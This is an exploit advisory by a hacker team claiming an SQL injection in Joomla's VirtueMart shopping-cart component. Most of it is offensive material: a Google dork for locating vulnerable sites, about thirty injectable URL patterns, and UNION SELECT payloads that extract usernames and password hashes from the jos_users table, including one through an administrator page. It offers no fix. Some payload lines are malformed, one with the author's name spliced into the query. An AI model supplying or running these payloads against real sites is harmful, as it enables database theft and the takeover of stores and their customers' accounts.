####################################################################

# Exploit Title : Joomla VirtueMart 3.4.1 SQL Injection
# Author [ Discovered By ] : KingSkrupellos
# Team : Cyberizm Digital Security Army
# Date : 14/02/2019
# Vendor Homepage : virtuemart.net
# Software Download Link : virtuemart.net/downloads
# Software Information Link : extensions.joomla.org/extension/virtuemart/
# Software Affected Version : 3.4.1 and other previous versions.
compatible with Joomla! 3.8.x and previous versions.
# Tested On : Windows and Linux
# Category : WebApps
# Exploit Risk : Medium
# Google Dorks : inurl:''/index.php?option=com_virtuemart''
# Vulnerability Type : CWE-89 [ Improper Neutralization of 
Special Elements used in an SQL Command ('SQL Injection') ]
# Old Similar CVE Numbers [ Version and Parameters are different ] : 
CVE-2016-10379 - CVE-2009-4430 - CVE-2007-3247 - CVE-2006-6945
cvedetails.com/cve/CVE-2016-10379/
cvedetails.com/cve/CVE-2009-4430/
cvedetails.com/cve/CVE-2007-3247/
cvedetails.com/cve/CVE-2006-6945/
# PacketStormSecurity : packetstormsecurity.com/files/authors/13968
# CXSecurity : cxsecurity.com/author/KingSkrupellos/1/
# Exploit4Arab : exploit4arab.org/author/351/KingSkrupellos

####################################################################

# Description about Software :
***************************
VirtueMart is a highly configurable and customizable multi-language shopping 

cart solution for Joomla 3.8 with a large number of additional extensions.

####################################################################

# Impact :
***********
Joomla VirtueMart 3.4.1 and other previous versions - 

component for Joomla is prone to an SQL-injection vulnerability because it 

fails to sufficiently sanitize user-supplied data before using it in an SQL query. 

Exploiting this issue could allow an attacker to compromise the application, 

access or modify data, or exploit latent vulnerabilities in the underlying database.

A remote attacker can send a specially crafted request to the vulnerable application 

and execute arbitrary SQL commands in application`s database.

Further exploitation of this vulnerability may result in unauthorized data manipulation.

An attacker can exploit this issue using a browser and via a web client.

Old CVE's Vulnerability Description => [ But this is a very new SQL inj vuln ]
**********************************

CVE-2016-10379 => CVSS Score 6.5
*******************
The VirtueMart com_virtuemart component 3.0.14  for Joomla! allows SQL injection by remote 

authenticated administrators via the virtuemart_paymentmethod_id or virtuemart_shipmentmethod_id 

parameter to administrator/index.php.
 
CVE-2009-4430 => CVSS Score 7.5
***************** 
SQL injection vulnerability in index.php in VirtueMart 1.0 allows remote attackers to 

execute arbitrary SQL commands via the product_id parameter in a 

shop.product_details shop.flypage action.	

CVE-2007-3247 => CVSS Score 6.8
****************** 
SQL injection vulnerability in VirtueMart before 1.0.11 allows remote attackers to 

execute arbitrary SQL commands via unspecified parameters, possibly related 

to improper input validation of the PATH_INFO (PHP_SELF) by virtuemart_parser.php.	

CVE-2006-6945 => CVSS Score 7.5
*******************
SQL injection vulnerability in Virtuemart 1.0.7 allows remote attackers to 

execute arbitrary SQL commands via unspecified vectors, probably related

 to (1) Itemid, (2) product_id, and category_id parameters as handled in virtuemart_parser.php.	

####################################################################

# SQL Injection Exploit :
**********************
/index.php?option=com_virtuemart&Itemid=[SQL Injection]

/index.php?page=shop.product_details&flypage=shop.flypage&product_id=[SQL Injection]

/index.php?option=com_virtuemart&view=category&virtuemart_category_id=[SQL Injection]&lang=en

/index.php?option=com_virtuemart&view=category&virtuemart_category_id=[SQL Injection]

/index.php?page=shop.product_details&amp;flypage=shop.flypage&amp;product_id=[SQL Injection]

/index.php?option=com_virtuemart&view=user&task=removeAddressST&virtuemart_userinfo_id=[SQL Injection]

/index.php?option=com_virtuemart&view=virtuemart&productsublayout=[ID-NUMBER]&Itemid=[SQL Injection]

/index.php?page=shop.browse&category_id=[ID-NUMBER]&vmcchk=[ID-NUMBER]&option=com_virtuemart&Itemid=[SQL Injection]

/index.php?option=com_virtuemart&page=shop.browse&category_id=[ID-NUMBER]&Itemid=[SQL Injection]

/index.php?option=com_virtuemart&page=shop.feed&category_id=[SQL Injection]

index.php?option=com_virtuemart&view=category&virtuemart_category_id=[ID-NUMBER]&limit=[ID-NUMBER]&limitstart=[SQL Injection]

/index.php?option=com_virtuemart&page=shop.product_details&flypage=flypage.tpl&product_id=[ID-NUMBER]&Itemid=[SQL Injection]

/index.php?option=com_virtuemart&view=productdetails&virtuemart_product_id=[ID-NUMBER]&virtuemart_category_id=[ID-NUMBER]&Itemid=[SQL Injection]

/index.php?option=com_virtuemart&page=shop.browse&category_id=[ID-NUMBER]&Itemid=[ID-NUMBER]&vmcchk=[ID-NUMBER]&Itemid=[SQL Injection]

/index.php?option=com_virtuemart&view=category&virtuemart_category_id=[ID-NUMBER]&limit=[SQL Injection]&orderby=mf_name&dir=DESC

/index.php?option=com_virtuemart&view=category&virtuemart_category_id=[ID-NUMBER]&Itemid=[ID-NUMBER]&limit=[SQL Injection]&orderby=mf_name

/index.php?option=com_virtuemart&category_id=[ID-NUMBER]&page=shop.browse&Itemid=[ID-NUMBER]&limitstart=[ID-NUMBER]&limit=[SQL Injection]

/index.php?option=com_virtuemart&page=shop.product_details&flypage=flypage.tpl&product_id=[ID-NUMBER]&Itemid=[SQL Injection]

/index.php?option=com_virtuemart&category_id=[ID-NUMBER]&page=shop.browse&Itemid=[ID-NUMBER]&limitstart=[ID-NUMBER]&limit=[SQL Injection]

/index.php?option=com_virtuemart&view=productdetails&virtuemart_product_id=[ID-NUMBER]&tmpl=component&print=[SQL Injection]

/index.php?option=com_virtuemart&tmpl=component&flexiblelayout=quicklook&view=productdetails&virtuemart_product_id=[ID-NUMBER]&virtuemart_category_id=[SQL Injection]

/index.php?option=com_virtuemart&page=shop.browse&category_id=[ID-NUMBER]&keyword=sample&manufacturer_id=[ID-NUMBER]&Itemid=[ID-NUMBER]&orderby=product_sku&limit=[ID-NUMBER]&limitstart=[SQL Injection]

/index.php?option=com_virtuemart&view=productdetails&task=askquestion&virtuemart_product_id=[ID-NUMBER]&virtuemart_category_id=[SQL Injection]&tmpl=component

/index.php?option=com_virtuemart&amp;view=category&amp;Itemid=[ID-NUMBER]&amp;lang=vi&amp;language=vi-VN&amp;order=DESC&amp;orderby=p.product_sku&amp;limit=[SQL Injection]

/index.php?DescOrderBy=DESC&Itemid=[ID-NUMBER]&option=com_virtuemart&page=shop.browse&category_id=[ID-NUMBER]&manufacturer_id=[ID-NUMBER]&keyword=&keyword1=&keyword2=[SQL Injection]

/index.php?page=shop.product_details&flypage=shop.flypage&product_id=[ID-NUMBER]&category_id=[ID-NUMBER]&manufacturer_id=[ID-NUMBER]&option=com_virtuemart&Itemid=[ID-NUMBER]&vmcchk=[ID-NUMBER]&Itemid=[SQL Injection]

/index.php?option=com_virtuemart&page=shop.browse&category_id=[ID-NUMBER]&keyword=&manufacturer_id=[ID-NUMBER]&Itemid=[ID-NUMBER]&orderby=%7Bvm%7D_product.product_name&limit=[ID-NUMBER]&limitstart=[SQL Injection]

/index.php?option=com_virtuemart&view=category&Itemid=[SQL Injection]&order=DESC&orderby=mf_name&virtuemart_manufacturer_id=[SQL Injection]&limit=[SQL Injection]

/index.php?option=com_virtuemart&page=shop.browse&category_id=[ID-NUMBER]&keyword=[ID-NUMBER]&manufacturer_id=[ID-NUMBER]&Itemid=[ID-NUMBER]&orderby=product_cdate&limit=[ID-NUMBER]&limitstart=[SQL Injection]

/index.php?option=com_virtuemart&page=shop.browse&category_id=[ID-NUMBER]&keyword=[ID-NUMBER]&manufacturer_id=[ID-NUMBER]&Itemid=[ID-NUMBER]&orderby=product_cdate&limit=[ID-NUMBER]&limitstart=[SQL Injection]&lang=nl

/index.php?option=com_virtuemart&view=category&virtuemart_category_id=[ID-NUMBER]&Itemid=&orderby=category_name&limit=[ID-NUMBER]&view=category&virtuemart_category_id=[ID-NUMBER]&Itemid=&limit=[SQL Injection]&order=DESC&orderby=category_name

/index.php?orderby=product_price&DescOrderBy=ASC&DescOrderBy=ASC&Itemid=[ID-NUMBER]&option=com_virtuemart&page=shop.browse&category_id=[ID-NUMBER]&manufacturer_id=[ID-NUMBER]&keyword=&keyword1=&keyword2=&limit=[ID-NUMBER]&limitstart=[SQL Injection]

/index.php?orderby=product_name&DescOrderBy=ASC&Itemid=[ID-NUMBER]&option=com_virtuemart&page=shop.browse&category_id=[ID-NUMBER]&manufacturer_id=[ID-NUMBER]&keyword=&keyword1=&keyword2=&limit=[ID-NUMBER]&limitstart=[ID-NUMBER]&vmcchk=[ID-NUMBER]&Itemid=[SQL Injection]

/administrator/index.php?page=order.order_status_form&limitstart=[ID-NUMBER]&keyword=&order_status_id=[SQL Injection]&option=com_virtuemart

# Example SQL Injection Payload :
********************************
200+union+select+1,2,3,4,5,version(),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,concat(username,0x3a,password,0x3a,gid,0x3a,id),26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55+from+jos_users-

200+union+select+1,2,3,4,5,version(),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,concat(username,0x3a,password,0x3a,gid,0x3a,id)KingSkrupellos,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55+from+jos_users+limit+1,1--&category_id=10&manufacturer_id=11&option=com_virtuemart&Itemid=1&vmcchk=1&Itemid=1

+limit+1,1--&category_id=10&manufacturer_id=11&option=com_virtuemart&Itemid=1&vmcchk=1&Itemid=1-

/administrator/index.php?page=order.order_status_form&limitstart=0&keyword=&order_status_id=-1%27+UNION+ALL+SELECT+1,username,password,@@version,database%28%29,6+FROM+jos_users%23&option=com_virtuemart

####################################################################

# Discovered By KingSkrupellos from Cyberizm.Org Digital Security Team 

####################################################################
